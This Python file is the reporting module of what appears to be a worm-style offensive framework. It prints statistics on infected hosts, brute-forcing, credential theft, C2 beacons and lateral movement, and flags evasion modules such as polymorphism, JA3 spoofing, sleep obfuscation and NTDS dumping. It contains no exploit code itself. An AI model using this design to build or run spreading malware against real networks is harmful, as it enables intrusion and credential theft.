import os
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from .module_imports import logger

_report_console = Console()


def _fmt_duration(seconds: float) -> str:
    """Humanize a duration in seconds (0.42s / 12.3m / 1.5h)."""
    if seconds < 60:
        return f"{seconds:.2f}s"
    if seconds < 3600:
        return f"{seconds / 60:.1f}m"
    return f"{seconds / 3600:.1f}h"


def _host_chips(hosts, style: str, limit: int = 8) -> str:
    """Render a compact comma list of host ips, truncated past `limit`."""
    hosts = list(hosts)
    shown = ", ".join(f"[{style}]{ip}[/]" for ip in sorted(hosts)[:limit])
    if len(hosts) > limit:
        shown += f" [dim]… and {len(hosts) - limit} more[/]"
    return shown or "[dim]none[/]"


class WormCoreReporting:
    def print_status(self):
        print(f"\n{'-' * 60}")
        print(f"Status Update:")
        print(f"  Infected: {len(self.infected_hosts)}")
        print(f"  Failed: {len(self.failed_targets)}")
        print(f"  Discovered: {self.stats['total_hosts_discovered']}")
        print(f"  Vulnerabilities: {self.stats['vulnerabilities_found']}")
        print(f"  Exploit Chains: {self.stats['exploit_chains_built']}")
        print(
            f"  Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
        )
        print(
            f"  Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
        )
        print(f"  Credentials Discovered: {self.stats['credentials_discovered']}")
        print(f"  C2 Beacons: {self.stats['c2_beacons']}")
        print(f"  Polymorphic Mutations: {self.stats['polymorphic_mutations']}")

        total_attempts = self.stats["infections"] + self.stats["failed_exploits"]
        success_rate = self.stats["infections"] / total_attempts * 100 if total_attempts > 0 else 0
        print(f"  Success Rate: {self.stats['infections']}/{total_attempts} ({success_rate:.1f}%)")

        if self.start_time:
            elapsed = datetime.now() - self.start_time
            print(f"  Runtime: {elapsed}")

        if self.knowledge_graph:
            kg_stats = self.knowledge_graph.get_statistics()
            print(f"  Knowledge Graph: {kg_stats['hosts']} hosts, {kg_stats['edges']} edges")

        if self.host_monitor:
            overview = self.host_monitor.get_network_overview()
            print(
                f"  Host Monitor: {overview['total_hosts']} hosts, "
                f"avg health {overview['avg_health']:.0f}%, "
                f"{overview['unique_payloads']} unique payloads, "
                f"{overview['total_repairs']} repairs"
            )

        if self.adaptive_cycle:
            apt_status = self.adaptive_cycle.get_full_status()
            print(f"\n  {'=' * 56}")
            print(f"  APT-LEVEL ADAPTIVE CYCLE STATUS")
            print(f"  {'=' * 56}")
            print(f"  Cycle Count: {apt_status['cycle_count']}")
            recon = apt_status["predictive_recon"]
            print(
                f"  Predictive Recon: {recon['hosts_analyzed']} hosts analyzed, "
                f"{recon['predictions_made']} predictions made"
            )
            selector = apt_status["exploit_selector"]
            print(
                f"  Adaptive Exploit: {selector['total_attempts']} attempts, "
                f"{selector['q_table_entries']} Q-table entries"
            )
            redundancy = apt_status["distributed_redundancy"]
            print(
                f"  Distributed Mesh: {redundancy['heartbeat']['active_peers']} active, "
                f"{redundancy['heartbeat']['dead_peers']} dead"
            )
            mimicry = apt_status["traffic_mimicry"]
            print(f"  Traffic Mimicry: {mimicry['active_protocol']} protocol")
            poly = apt_status["semantic_polymorphism"]
            print(f"  Semantic Polymorphism: {poly['unique_variants']} variants")
            cells = apt_status["dormant_cells"]
            print(
                f"  Dormant Cells: {cells['dormant']} dormant, "
                f"{cells['active']} active, {cells['total_cells']} total"
            )

        print(f"\n  {'=' * 56}")
        print(f"  EXTRA MODULES STATUS")
        print(f"  {'=' * 56}")
        if self.cloud_c2:
            try:
                c2_status = self.cloud_c2.get_status()
                print(f"  Cloud C2: {c2_status.get('enabled', [])}")
            except Exception:
                print(f"  Cloud C2: enabled")
        if self.multi_operator:
            try:
                op_status = self.multi_operator.get_status()
                print(f"  Multi-Operator: {op_status.get('operators', 0)} operators")
            except Exception:
                print(f"  Multi-Operator: running")
        if self.mitre_mapper:
            try:
                mitre_status = self.mitre_mapper.get_status()
                print(
                    f"  MITRE ATT&CK: {mitre_status.get('total_techniques', 0)} techniques mapped"
                )
            except Exception:
                print(f"  MITRE ATT&CK: enabled")
        if self.plugin_manager:
            try:
                plugin_stats = self.plugin_manager.get_plugin_stats()
                print(
                    f"  Plugins: {plugin_stats.get('enabled', 0)} enabled / {plugin_stats.get('total', 0)} total"
                )
            except Exception:
                enabled = len(self.plugin_manager.get_enabled_plugins())
                print(f"  Plugins: {enabled} enabled")
        print(f"  ICMP Tunnel: {'enabled' if self.icmp_tunnel else 'disabled'}")
        print(f"  JA3 Spoofing: {'enabled' if self.ja3_spoofer else 'disabled'}")
        print(f"  DCOM Lateral: {'enabled' if self.dcom_lateral else 'disabled'}")
        print(f"  Direct Syscalls: {'enabled' if self.direct_syscalls else 'disabled'}")
        print(f"  Sleep Obfuscation: {'enabled' if self.sleep_obfuscator else 'disabled'}")
        print(f"  Local Persistence: {'enabled' if self.local_persistence else 'disabled'}")
        print(f"  VSS NTDS: {'enabled' if self.vss_ntds else 'disabled'}")
        print(f"  Swarm Coordinator: {'enabled' if self.swarm_coordinator else 'disabled'}")
        print(f"  Payload Manager: {'enabled' if self.payload_manager else 'disabled'}")
        print(f"  Fuzzing Engine: {'enabled' if self.fuzzing_engine else 'disabled'}")
        pfs_count = self.stats.get("pfs_beacons", 0)
        print(
            f"  PFS Crypto: {'enabled' if self.pfs_crypto else 'disabled'}{f' ({pfs_count} beacons)' if pfs_count else ''}"
        )

        print(f"{'-' * 60}\n")

    def print_final_report(self):
        # Resolve start BEFORE end: when a session never set start_time the
        # old code stamped end first, making end < start by microseconds and
        # printing "Duration: -1 day, 23:59:59.999998".
        start_time = (
            self.stats.get("start_time")
            or getattr(self, "start_time", None)
            or datetime.now()
        )
        end_time = self.stats.get("end_time") or datetime.now()
        if end_time < start_time:
            end_time = start_time  # clock-skew guard, never negative
        self.stats["start_time"] = start_time
        self.stats["end_time"] = end_time
        seconds = max((end_time - start_time).total_seconds(), 0.0)

        attempts = self.stats["infections"] + self.stats["failed_exploits"]

        t = Table.grid(padding=(0, 2))
        t.add_column(style="dim", justify="right")
        t.add_column(style="bold")
        t.add_row("Duration", _fmt_duration(seconds))
        t.add_row("Infections", str(self.stats["infections"]))
        t.add_row("Failed", str(self.stats["failed_exploits"]))
        if attempts:
            t.add_row("Success Rate", f"{self.stats['infections'] / attempts * 100:.1f}%")
        t.add_row("Scans", str(self.stats["scans"]))
        t.add_row("Hosts Discovered", str(self.stats["total_hosts_discovered"]))
        t.add_row("Vulnerabilities Found", str(self.stats["vulnerabilities_found"]))
        t.add_row("Exploit Chains Built", str(self.stats["exploit_chains_built"]))
        t.add_row(
            "Lateral Movements", f"{self.stats['lateral_success']}/{self.stats['lateral_movements']}"
        )
        t.add_row(
            "Brute Force",
            f"{self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}",
        )
        t.add_row("Credentials Discovered", str(self.stats["credentials_discovered"]))
        t.add_row("C2 Beacons", str(self.stats["c2_beacons"]))
        t.add_row("Polymorphic Mutations", str(self.stats["polymorphic_mutations"]))

        if self.infected_hosts:
            t.add_row("Infected Hosts", _host_chips(self.infected_hosts, "green"))
        if self.failed_targets:
            t.add_row("Failed Targets", _host_chips(self.failed_targets, "red"))

        _report_console.print(
            Panel(
                t,
                title="[bold]Final report[/] [dim]— engagement summary[/]",
                border_style="bright_blue",
                padding=(0, 1),
            )
        )

        # Detail sections only when they carry data: an empty REPL session
        # used to dump four all-zero blocks of noise on every exit.
        if self.cred_manager and (
            self.stats["credentials_discovered"] or self.stats["brute_force_attempts"]
        ):
            self.cred_manager.print_statistics()

        if self.lateral_movement and self.stats["lateral_movements"]:
            lm_stats = self.lateral_movement.get_statistics()
            print("\nLateral Movement:")
            print(f"  Attempts: {lm_stats['attempts']}")
            print(f"  Successes: {lm_stats['successes']}")
            print(f"  Rate: {lm_stats['success_rate']:.1f}%")
            print(f"  By technique: {lm_stats['by_technique']}")

        if self.knowledge_graph and len(self.scan_results):
            kg_summary = self.knowledge_graph.get_network_summary()
            print("\nKnowledge Graph Summary:")
            for k, v in kg_summary.items():
                print(f"  {k}: {v}")

        if self.polymorphic_engine and self.stats["polymorphic_mutations"]:
            poly_stats = self.polymorphic_engine.get_statistics()
            print("\nPolymorphic Engine:")
            print(f"  Mutations: {poly_stats['mutations_generated']}")
            print(f"  Unique signatures: {poly_stats['unique_signatures']}")

        if self.audit_generator:
            try:
                exploit_stats = (
                    self.exploit_manager.get_statistics()
                    if hasattr(self.exploit_manager, "get_statistics")
                    else {}
                )
                cred_stats = self.cred_manager.get_statistics() if self.cred_manager else {}
                lm_stats = self.lateral_movement.get_statistics() if self.lateral_movement else {}

                report_files = self.audit_generator.generate(
                    worm_stats=self.stats,
                    scan_results=self.scan_results,
                    infected_hosts=self.infected_hosts,
                    failed_targets=self.failed_targets,
                    exploit_stats=exploit_stats,
                    credential_stats=cred_stats,
                    lateral_movement_stats=lm_stats,
                    output_dir="reports",
                )
                logger.info(f"Audit reports: {report_files}")
                # Console footer (not logger): `wormy shell` keeps the
                # terminal at WARNING+, and the operator still needs to see
                # where the audit trail landed.
                names = " · ".join(os.path.basename(p) for p in report_files.values())
                _report_console.print(
                    f"[green]Reports written:[/] [cyan]{names}[/] [dim](./reports/)[/]"
                )
            except Exception as e:
                logger.warning(f"Failed to generate audit report: {e}")

        if self.knowledge_graph:
            try:
                os.makedirs("reports", exist_ok=True)
                self.knowledge_graph.export_graph("reports/knowledge_graph.json")
            except Exception as e:
                logger.warning(f"Failed to export knowledge graph: {e}")

        try:
            logger.export_logs("reports/final_report.json")
        except Exception:
            pass
